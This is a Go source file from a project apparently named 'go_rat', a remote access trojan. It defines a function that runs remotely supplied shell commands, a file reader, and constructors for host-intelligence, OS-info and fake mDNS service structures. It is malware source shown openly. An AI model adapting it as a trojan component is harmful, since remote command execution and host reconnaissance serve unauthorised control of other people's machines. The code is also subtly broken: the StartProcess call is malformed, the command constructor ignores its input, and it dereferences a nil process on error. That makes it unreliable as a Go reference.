/*/
This file contains the functions necessary for new commands and stuff lol

/*/
package Core

import (
	"go_rat/pkg/shared_code/ErrorHandling"
	"io/ioutil"
	"os"
)

//function to execute command
// Takes a Command struct
// returns RatProcess struct
func exec_command(command_struct *Command) *RatProcess {
	shell_arguments := command_struct.Command_string
	attributes := os.ProcAttr{
		Dir: "./",
		// Env not used
		// File not used
	}
	herp, derp := os.StartProcess("shell command", shell_arguments, &attributes)
	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
		//return
	}
	new_process := RatProcess{
		Pid:     herp.Pid,
		Process: herp,
	}
	return &new_process
}

func AnyToString(filename string) (string, error) {
	filebuffer, derp := ioutil.ReadFile(filename)
	if derp != nil {
		ErrorHandling.RatLogError(derp, "[-] ERROR: Cannot Convert Data Object to String")
	}
	fileasstring := string(filebuffer)
	return fileasstring, derp
}

/*/
Must have a way of constructing new structs,
they are structures, you must build them
only need a constructor if they need parameters assigned at birth
/*/

// cant have multiple commands without something to represent a CommandSet
// Only one per entity, currently.
// future revisions will have multiple CommandSets
func NewCommandSet() *CommandSet {
	return &CommandSet{}
}

// function to create a new Command Struct
// we want to return the memory address
// not the contents of that memory address
// We also expect there to be a json input already prepared
func NewCommand(json_input string) *Command {
	new_command := Command{}
	return &new_command
}

// to make things easier on yourself later:
// using a pointer as a return...
// ## Continues: in intel.go -- GatherIntel()
func NewHostIntel() *HostIntel {
	new_host_intel := HostIntel{}
	// do this to return a pointer
	// its a reference to the memory address
	return &new_host_intel
}
func NewOSInfo() *OSInfo {
	new_os_info := OSInfo{}
	return &new_os_info
}

func NewFakeMDNSService() *FakeMDNSService {
	new_mdns_service := FakeMDNSService{}
	return &new_mdns_service
}
